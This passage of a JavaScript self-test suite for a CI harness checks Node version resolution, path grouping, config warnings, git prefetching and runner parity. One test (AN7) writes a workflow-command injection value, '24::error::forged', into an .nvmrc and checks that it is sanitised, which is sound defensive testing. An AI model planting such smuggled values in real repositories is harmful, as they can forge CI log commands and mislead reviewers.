export PATH HARNESS_NODE NPX_DIRS GITHUB_OUTPUT
bash '${anW}/resolve.sh'
`)
    const invokeAn = (name, files, dirs) => {
      const t = path.join(anWork, name)
      fs.mkdirSync(t, { recursive: true })
      for (const d of dirs.split(' ')) fs.mkdirSync(path.join(t, d), { recursive: true })
      for (const [f, text] of Object.entries(files)) put(t, f, text)
      const r = runBash([`${anW}/driver.sh`, fwd(t), dirs])
      const ghoPath = path.join(t, '.gho')
      const fm = fs.existsSync(ghoPath) ? /^file=(.*)$/mu.exec(fs.readFileSync(ghoPath, 'utf8').replaceAll('\r', '')) : null
      return { Out: r.Out, Code: r.Code, File: fm ? fm[1] : '' }
    }
    const n1 = invokeAn('nvmrc', { '.nvmrc': '24\n' }, '.')
    check('AN1 a .nvmrc in the gate directory becomes the setup-node file, with one version line',
      n1.Code === 0 && n1.File === '.nvmrc' && m(n1.Out, P`(?m)^node version \(\.\): 24 .*\.nvmrc$`) && nm(n1.Out, '::warning::'), `exit=${n1.Code} file=[${n1.File}]\n${n1.Out}`)
    const n2 = invokeAn('none', { 'package.json': '{"name":"x","devDependencies":{"eslint":"9"}}' }, '.')
    check('AN2 no declaration writes no file, so setup-node is skipped and the image Node stays',
      n2.Code === 0 && n2.File === '' && m(n2.Out, P`(?m)^node version \(\.\): `) && nm(n2.Out, '::warning::'), `exit=${n2.Code} file=[${n2.File}]\n${n2.Out}`)
    // AN3 (ADR 0178): engines.node is a compatibility range, never a choice. A loose `>=18` must not move a
    // repo off the image Node with no repo change; the line names the range and asks for an .nvmrc.
    const n3 = invokeAn('engines', { 'package.json': '{"engines":{"node":">=24.22.0 <25"}}' }, '.')
    const n3b = invokeAn('engines-loose', { 'package.json': '{"engines":{"node":">=18"}}' }, '.')
    check('AN3 package.json engines.node alone chooses no Node: no file, a line naming the range and .nvmrc',
      n3.Code === 0 && n3.File === '' && m(n3.Out, P`(?m)^node version \(\.\): .*engines\.node >=24\.22\.0 <25 .*\.nvmrc`) && nm(n3.Out, '::warning::') &&
      n3b.Code === 0 && n3b.File === '' && m(n3b.Out, P`(?m)^node version \(\.\): .*engines\.node >=18 .*\.nvmrc`) && nm(n3b.Out, '::warning::'), `strict:\n${n3.Out}\nloose:\n${n3b.Out}`)
    // AN3b: a blank volta.node chooses nothing, so the range behind it is named;
    // blank range values name nothing.
    const n3c = invokeAn('volta-blank', { 'package.json': '{"volta":{"node":"  "},"engines":{"node":">=18"}}' }, '.')
    const n3d = invokeAn('range-blank', { 'package.json': '{"devEngines":{"runtime":{"name":"node","version":" "}},"engines":{"node":""}}' }, '.')
    check('AN3b a blank volta.node chooses no Node and the range behind it is named; blank ranges name nothing',
      n3c.Code === 0 && n3c.File === '' && m(n3c.Out, P`(?m)^node version \(\.\): .*engines\.node >=18 `) &&
      n3d.Code === 0 && n3d.File === '' && nm(n3d.Out, P`engines\.node`) && nm(n3d.Out, P`devEngines\.runtime `), `volta-blank:\n${n3c.Out}\nrange-blank:\n${n3d.Out}`)
    const n4 = invokeAn('order-files', { 'web/.node-version': '22\n', 'web/.nvmrc': '# pinned\n24\n', 'web/package.json': '{"engines":{"node":"20"}}' }, 'web')
    check('AN4 .nvmrc wins over .node-version and package.json; a comment line is skipped', n4.Code === 0 && n4.File === 'web/.nvmrc' && m(n4.Out, P`(?m)^node version \(web\): 24 `), `exit=${n4.Code} file=[${n4.File}]\n${n4.Out}`)
    const n5 = invokeAn('order-package', { 'package.json': '{"engines":{"node":"20"},"devEngines":{"runtime":[{"name":"bun","version":"1"},{"name":"node","version":"22"}]},"volta":{"node":"24.1.0"}}' }, '.')
    const n5b = invokeAn('order-devengines', { 'package.json': '{"engines":{"node":"20"},"devEngines":{"runtime":[{"name":"bun","version":"1"},{"name":"node","version":"22"}]}}' }, '.')
    check('AN5 inside package.json only volta.node chooses a Node; devEngines.runtime is a range, named before engines.node',
      n5.Code === 0 && n5.File === 'package.json' && m(n5.Out, P`(?m)^node version \(\.\): 24\.1\.0 `) &&
      n5b.Code === 0 && n5b.File === '' && m(n5b.Out, P`(?m)^node version \(\.\): .*devEngines\.runtime 22 `) && nm(n5b.Out, P`engines\.node 20`), `volta:\n${n5.Out}\ndevEngines:\n${n5b.Out}`)
    const n6 = invokeAn('dirs-agree', { 'api/.node-version': 'v24\n', 'web/.nvmrc': '24\n' }, 'api web')
    const n6b = invokeAn('dirs-differ', { 'api/.nvmrc': '22\n', 'web/.nvmrc': '24\n' }, 'api web')
    check('AN6 two directories that agree (v24 = 24) pick the first file; two that differ get a warning and no file',
      n6.Code === 0 && n6.File === 'api/.node-version' && nm(n6.Out, '::warning::') &&
      n6b.Code === 0 && n6b.File === '' && m(n6b.Out, P`(?m)^::warning::.*api/\.nvmrc=22, web/\.nvmrc=24 .*ADR 0177`), `agree file=[${n6.File}]\n${n6.Out}\ndiffer file=[${n6b.File}]\n${n6b.Out}`)
    // AN7: the value reaches a log line and, on a disagreement, a ::warning:: line — a ':' kept in it
    // would let a repo file forge a workflow command.
    const n7 = invokeAn('forge', { 'api/.nvmrc': '24::error::forged\n', 'web/.nvmrc': '22\n' }, 'api web')
    check('AN7 a declared value reaches the log with version characters only',
      n7.Code === 0 && nm(n7.Out, '(?m)^::error::') && nm(n7.Out, '::error') && m(n7.Out, '24errorforged') && count(n7.Out, /^::/gmu) === 1, `exit=${n7.Code}\n${n7.Out}`)
    // AN10: one job holds one Node, so a directory that declares nothing runs
    // on another directory's declaration — its line must say so, never "the runner image's Node".
    const n10 = invokeAn('undeclared-inherits', { 'api/.nvmrc': '24\n', 'legacy/package.json': '{"name":"legacy"}' }, 'api legacy')
    const n10b = invokeAn('undeclared-image', { 'api/.nvmrc': '22\n', 'web/.nvmrc': '24\n', 'legacy/package.json': '{"name":"legacy"}' }, 'api legacy web')
    // The undeclared directory FIRST: a label taken from the declarations seen so far passes the
    // 'api legacy' order and fails this one.
    const n10c = invokeAn('undeclared-first', { 'api/.nvmrc': '24\n', 'legacy/package.json': '{"name":"legacy"}' }, 'legacy api')
    const nodeLines = (o, d) => count(o, new RegExp(`^node version \\(${d}\\): `, 'gmu'))
    check('AN10 an undeclared directory names the declared file it inherits in either order, or the image Node when nothing is set up; one line per directory',
      n10.File === 'api/.nvmrc' && m(n10.Out, P`(?m)^node version \(legacy\): .*api/\.nvmrc`) &&
      n10c.File === 'api/.nvmrc' && m(n10c.Out, P`(?m)^node version \(legacy\): .*api/\.nvmrc`) &&
      n10b.File === '' && m(n10b.Out, P`(?m)^node version \(legacy\): `) && nm(n10b.Out, P`(?m)^node version \(legacy\): .*(api|web)/\.nvmrc`) &&
      nodeLines(n10.Out, 'api') === 1 && nodeLines(n10.Out, 'legacy') === 1 && nodeLines(n10c.Out, 'api') === 1 && nodeLines(n10c.Out, 'legacy') === 1 &&
      nodeLines(n10b.Out, 'api') === 1 && nodeLines(n10b.Out, 'legacy') === 1 && nodeLines(n10b.Out, 'web') === 1,
      `inherit file=[${n10.File}]\n${n10.Out}\nfirst file=[${n10c.File}]\n${n10c.Out}\nimage file=[${n10b.File}]\n${n10b.Out}`)
    const n8 = invokeAn('bad-json', { 'package.json': '{"engines": ' }, '.')
    check('AN8 an unparseable package.json is a named warning, never a crash or a file', n8.Code === 0 && n8.File === '' && m(n8.Out, P`(?m)^::warning::package\.json .*JSONDecodeError`), `exit=${n8.Code} file=[${n8.File}]\n${n8.Out}`)
    // AN9: a sub-directory that chooses nothing falls back to the root version file, never to the root
    // package.json. Its own engines range chooses nothing either (ADR 0178), so the root file still
    // wins over it, and its one line still names that range; its own
    // volta.node is a choice and wins over the root file.
    const n9 = invokeAn('root-fallback', { '.nvmrc': '24\n', 'package.json': '{"engines":{"node":"20"}}', 'web/package.json': '{"name":"web"}' }, 'web')
    const n9b = invokeAn('own-range-root-file', { '.nvmrc': '24\n', 'web/package.json': '{"engines":{"node":"22"}}' }, 'web')
    const n9c = invokeAn('root-package-only', { 'package.json': '{"volta":{"node":"20.1.0"}}', 'web/package.json': '{"name":"web"}' }, 'web')
    const n9d = invokeAn('own-volta-beats-root', { '.nvmrc': '24\n', 'web/package.json': '{"volta":{"node":"22.3.0"}}' }, 'web')
    check('AN9 a sub-directory uses the root .nvmrc over its own range; its own volta.node wins; a root package.json never counts',
      n9.File === '.nvmrc' && m(n9.Out, P`(?m)^node version \(web\): 24 `) && n9b.File === '.nvmrc' &&
      m(n9b.Out, P`(?m)^node version \(web\): 24 .*\.nvmrc.*web .*engines\.node 22 `) && count(n9b.Out, /^node version \(web\): /gmu) === 1 &&
      n9c.File === '' && n9d.File === 'web/package.json' && m(n9d.Out, P`(?m)^node version \(web\): 22\.3\.0 `),
      `fallback file=[${n9.File}]\n${n9.Out}\nrange file=[${n9b.File}]\n${n9b.Out}\nroot-pkg file=[${n9c.File}]\n${n9c.Out}\nvolta file=[${n9d.File}]\n${n9d.Out}`)
  }
  })
  section('AO', [], async () => {
  // --- AO: an explicit file is read as a path from the repo root, whatever way it is written -------
  // Group patterns are anchored to repo-root-relative POSIX paths, so `./api/app.py`, an absolute path,
  // a backslash path and a path typed from a sub-directory must all land in the group `api/app.py` does.
  // A path outside the repo has no root-relative form: it stays as given and is listed ungrouped.
  // `git diff --name-only` prints root-relative paths in every directory, so `api/app.py` given from
  // inside `api/` names no `api/api/app.py` and must keep its root reading.
  const repoAO = newRepo('explicit-paths', CFG, ['api/app.py', 'api/sub/deep.py'])
  const aoDot = await gates(repoAO, ['./api/app.py'])
  const aoAbs = await gates(repoAO, [path.join(repoAO, 'api/app.py')])
  const aoBack = await gates(repoAO, [`api${BS}app.py`])
  check('AO1 ./api/app.py, an absolute path and a backslash path all reach group api, none ungrouped',
    (m(aoDot.Out, P`\[api\] 1 file\(s\)`) && m(aoDot.Out, P`ruff check app\.py`) && nm(aoDot.Out, 'ungrouped')) &&
    (m(aoAbs.Out, P`\[api\] 1 file\(s\)`) && m(aoAbs.Out, P`ruff check app\.py`) && nm(aoAbs.Out, 'ungrouped')) &&
    (m(aoBack.Out, P`\[api\] 1 file\(s\)`) && nm(aoBack.Out, 'ungrouped')), `dot:\n${aoDot.Out}\nabs:\n${aoAbs.Out}\nback:\n${aoBack.Out}`)
  const aoSub = await gates(repoAO, ['app.py', 'sub/deep.py', '../api/app.py', 'api/app.py'], { cwd: path.join(repoAO, 'api') })
  check('AO2 paths typed from a sub-directory are made root-relative, a root-relative path that names nothing from there stays as given; a repeat of one file counts once',
    m(aoSub.Out, P`\[api\] 2 file\(s\)`) && m(aoSub.Out, P`ruff check app\.py sub/deep\.py`) && nm(aoSub.Out, 'ungrouped'), aoSub.Out)
  const aoOut = await gates(repoAO, [path.join(fx, 'outside-the-repo.py')])
  check('AO3 a path outside the repo does not crash: exit 0, listed ungrouped under the name given',
    aoOut.Code === 0 && nm(aoOut.Out, 'Traceback') && m(aoOut.Out, P`ungrouped \(1 file`) && m(aoOut.Out, P`outside-the-repo\.py`), `exit=${aoOut.Code} out=${aoOut.Out}`)
  })
  section('AP', [], async () => {
  // --- AP: a mistyped declaration warns once, and names what is wrong ------------------------------
  // `gates` as a string must warn once, not once per character. A bad review regex must warn once, not
  // once per changed file.
  const cfgAP = rep(rep(rep(CFG, '"gates": ["ruff", "pytest-nondb"]', '"gates": "ruff"'), P`"harness_layer": ["^\\.harnessdir/"]`, '"harness_layer": ["["]'), '"critical": ["^migrations/"]', '"critical": ["("]')
  const repoAP = newRepo('declaration-types', cfgAP, ['api/a.py', 'api/b.py', 'api/c.py'])
  const rAP = await gates(repoAP)
  const apGateWarns = lines(rAP.Out).filter((l) => m(l, P`groups\[api\]\.gates`))
  check('AP1 gates given as a string gives ONE warning that names the type, not one per character',
    apGateWarns.length === 1 && m(apGateWarns[0], 'expected a list') && m(apGateWarns[0], 'str'), `warnings: ${apGateWarns.join(' | ')}\n${rAP.Out}`)
  const apCrit = lines(rAP.Out).filter((l) => m(l, P`review\.critical: not a valid regex`))
  const apLayer = lines(rAP.Out).filter((l) => m(l, P`review\.harness_layer: not a valid regex`))
  check('AP2 a bad review.critical regex over three changed files warns once, and so does a bad harness_layer regex', apCrit.length === 1 && apLayer.length === 1, `critical: ${apCrit.length} layer: ${apLayer.length}\n${rAP.Out}`)
  })
  section('PF', [], async () => {
  // --- PF: prefetch + main takes every read it prefetched (ywr-harness ADR 0236) ---------------------------------
  // Each run is a child that imports harness_gates.mjs and harness_git.mjs by file URL, so the count it prints comes from
  // the git module instance that the script uses. A kept result is taken only by `main`, so a count of 0 after `main`
  // shows that `main` made each read that `prefetch` started. The count before `main` is the number of reads that
  // `prefetch` kept for this run. The fixture has a declared artifact and an origin (the `remote get-url` read),
  // a `.githooks/` folder (the two hooksPath reads), and one tracked-then-changed and one untracked file (the scope
  // names a file, so the trailer reads run). The same argv runs again with no prefetch, and the stdout must match byte for byte.
  const cfgPF = `{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "artifacts": { "readme": "README.md", "items": [ { "url": "https://claude.ai/code/artifact/AbCdEf12-3456-7890-abcd-ef1234567890", "title": "prefetch-gates · docs" } ] },
  "groups": [ { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "", "gates": [] } ]
}`
  const repoPF = newRepo('prefetch-gates', cfgPF, ['.githooks/pre-commit', 'src/x.py'])
  fixtureCommit(repoPF, 'add files')
  gitq(repoPF, ['remote', 'add', 'origin', 'https://example.invalid/acme/prefetch-gates.git'])
  put(repoPF, 'src/x.py', 'changed')
  put(repoPF, 'src/y.py', 'untracked')
  const bodyPF = async (scriptsDir, mode, ...argv) => {
    const path = (await import('node:path')).default
    const { pathToFileURL } = await import('node:url')
    const m = await import(pathToFileURL(path.join(scriptsDir, 'harness_gates.mjs')).href)
    const g = await import(pathToFileURL(path.join(scriptsDir, 'harness_git.mjs')).href)
    if (mode === 'prefetch') await m.prefetch(argv)
    const before = g.git_prefetch_pending()
    const code = m.main(argv)
    process.stderr.write(`PFG ${JSON.stringify([before, g.git_prefetch_pending(), code])}\n`)
  }
  const childPF = put(fx, 'prefetch-gates-child.mjs', `await (${bodyPF.toString()})(...process.argv.slice(2))\n`)
  const spawnPF = (args) => new Promise((resolve) => {
    const c = spawn(process.execPath, args, { env: childEnv(), windowsHide: true })
    let so = ''; let se = ''
    c.stdout.setEncoding('utf8'); c.stderr.setEncoding('utf8')
    c.stdout.on('data', (d) => { so += d }); c.stderr.on('data', (d) => { se += d })
    c.on('close', (code) => resolve({ status: code, stdout: so, stderr: se }))
  })
  const runPF = async (mode, argv) => {
    const r = await spawnPF([childPF, here, mode, '--repo', repoPF, ...argv])
    const hit = /^PFG (\[.*\])$/mu.exec(r.stderr)
    return { out: r.stdout, err: r.stderr, got: hit ? JSON.parse(hit[1]) : null }
  }
  const [plain, plainP, range, rangeP, tree, treeP] = await Promise.all([
    runPF('plain', []), runPF('prefetch', []), runPF('plain', ['--range', 'HEAD~1..HEAD']), runPF('prefetch', ['--range', 'HEAD~1..HEAD']),
    runPF('plain', ['--tree']), runPF('prefetch', ['--tree']),
  ])
  const gotOf = (r) => JSON.stringify(r.got)
  check('PF1 no argument: prefetch keeps 7 reads (origin, two scope reads, two hooksPath reads, two ignore reads) and main takes all 7',
    gotOf(plainP) === '[7,0,0]' && gotOf(plain) === '[0,0,0]', `plain ${gotOf(plain)} prefetch ${gotOf(plainP)}\n${plainP.err}`)
  check('PF1 no argument: the run reaches the artifact, hooks and trailer lines, and its stdout equals the run with no prefetch',
    plainP.out === plain.out && m(plainP.out, P`(?m)^artifact: ok — README\.md|^artifact: VIOLATION`) && m(plainP.out, P`(?m)^hooks: `) && m(plainP.out, P`(?m)^gates:`),
    `prefetch:\n${plainP.out}\nplain:\n${plain.out}`)
  check('PF2 --range HEAD~1..HEAD: prefetch keeps 8 reads and main takes all 8, and the stdout equals the run with no prefetch',
    gotOf(rangeP) === '[8,0,0]' && gotOf(range) === '[0,0,0]' && rangeP.out === range.out && m(rangeP.out, P`(?m)^hooks: `),
    `plain ${gotOf(range)} prefetch ${gotOf(rangeP)}\n${rangeP.err}\nprefetch:\n${rangeP.out}\nplain:\n${range.out}`)
  check('PF3 --tree: prefetch keeps 2 reads (HEAD and the index path) and main takes both, and the stdout equals the run with no prefetch',
    gotOf(treeP) === '[2,0,0]' && gotOf(tree) === '[0,0,0]' && treeP.out === tree.out && m(treeP.out, P`(?m)^tree: [0-9a-f]+ · HEAD [0-9a-f]+`),
    `plain ${gotOf(tree)} prefetch ${gotOf(treeP)}\n${treeP.err}\nprefetch:\n${treeP.out}\nplain:\n${tree.out}`)
  })
  section('RUN', ['A', 'I', 'J', 'S2', 'Y1', 'Y2'], async () => {
  // --- RUN: the in-process runner prints what a child prints (ADR 0160) ----------------------------
  // Last on purpose: a state leak from any earlier driver run would show here. Each repo runs as a real
  // child and through the driver. Each stream must match byte for byte, with the same exit code. The
  // compare never joins the two streams: their arrival order differs from run to run.
  // The four shapes are a clean run, a stderr warn beside stdout, the one non-zero scope exit, and an
  // argument-parser refusal, which leaves through process exit 2.
  // RUN0 holds the child runner to a fixed input: the child runner reads each pipe on its own, so each
  // stream keeps its order and no line crosses over.
  const run0Script = put(fx, 'run0_streams.mjs', "process.stdout.write('out one\\n')\nprocess.stderr.write('err one\\n')\nprocess.stdout.write('out two\\n')\n")
  const run0 = runNode([run0Script])
  check('RUN0 the child runner keeps each stream in order and moves no line across',
    toChildText(run0.stdout) === 'out one\nout two\n' && toChildText(run0.stderr) === 'err one\n', `stdout:\n${run0.stdout}stderr:\n${run0.stderr}`)
  if (runnerMode === 'child' && process.env.HARNESS_GATES_SELFTEST_RUNNER === 'child') {
    reg('RUN', { skip: 'every run was a child, so the driver has nothing to match (reported, not silent)' }, () => {}, true)
  } else if (runnerMode === 'child') {
    check('RUN1-RUN4 driver = child', false, 'the driver failed earlier in this run (see RUN driver), so nothing was matched')
  } else {
    for (const rc of [
      { name: "RUN1 a clean run (case A's repo): driver = child", repo: repoA, extra: [], want: (x) => x === 0 },
      { name: "RUN2 a stderr warn beside stdout (case S2's repo): driver = child", repo: repoS2, extra: [], want: (x) => x === 0 },
      { name: 'RUN3 an unresolvable range (case Y1): driver = child, non-zero', repo: repoY1, extra: ['--range', 'no-such-ref..HEAD'], want: (x) => x !== 0 },
      { name: 'RUN4 an unknown option (argparse, SystemExit): driver = child, exit 2', repo: repoA, extra: ['--no-such-option'], want: (x) => x === 2 },
    ]) {
      const c = gatesChild(rc.repo, rc.extra)
      let d
      try { d = await gatesDriver(rc.repo, rc.extra) } catch (e) { d = { StdOut: `driver fault: ${String(e.message).trim()}`, Err: '', Code: -1 } }
      check(rc.name, c.StdOut === d.StdOut && c.Err === d.Err && c.Code === d.Code && rc.want(c.Code),
        `child exit=${c.Code}\nstdout:\n${c.StdOut}stderr:\n${c.Err}--- driver exit=${d.Code}\nstdout:\n${d.StdOut}stderr:\n${d.Err}`)
    }
  }
  })
  await runSections(sections)
  console.log(`note [harness_gates] runner at the end: ${runnerMode} · ${childRerun} driver repl(ies) re-run as a child for stream order (ADR 0160)`)
}

// Every test reads a value that body() already took, so the driver ends and the fixture root goes as soon as
// body() ends, whether it ended or aborted. An `after` hook would run
// too early: the test runner closes its root when the queue of registered tests is empty, and body()
// registers tests while it still awaits the driver.
try {
  await body()
} catch (e) {
  // An abort is a FAIL line, never a quiet early end.
  const err = e
  test('ABORT1 the suite body ran to its end', () => { throw err })
} finally {
  await stopDriver(true)
  removeFixtureRoot(fx)
}
